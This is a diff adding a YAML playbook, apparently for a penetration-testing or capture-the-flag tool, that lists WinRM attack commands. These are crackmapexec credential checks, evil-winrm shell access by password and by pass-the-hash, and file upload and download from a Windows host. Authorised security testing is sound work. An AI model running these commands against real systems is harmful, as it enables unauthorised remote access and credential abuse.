@@ -1,0 +1,30 @@
+service: winrm
+ports: [5985, 5986]
+categories:
+  enumeration:
+    - id: winrm_check
+      description: "Check if WinRM is accessible"
+      command: "crackmapexec winrm {IP}"
+      priority: high
+    - id: winrm_auth
+      description: "Test credentials via WinRM"
+      command: "crackmapexec winrm {IP} -u '{USER}' -p '{PASS}'"
+      priority: high
+  exploitation:
+    - id: winrm_evil
+      description: "Get shell via Evil-WinRM"
+      command: "evil-winrm -i {IP} -u '{USER}' -p '{PASS}'"
+      priority: high
+    - id: winrm_evil_hash
+      description: "Pass-the-hash via Evil-WinRM"
+      command: "evil-winrm -i {IP} -u '{USER}' -H '{HASH}'"
+      priority: high
+  post_exploitation:
+    - id: winrm_upload
+      description: "Upload file via Evil-WinRM"
+      command: "upload /path/to/file C:\\Windows\\Temp\\file"
+      priority: medium
+    - id: winrm_download
+      description: "Download file via Evil-WinRM"
+      command: "download C:\\Users\\Administrator\\Desktop\\flag.txt"
+      priority: medium
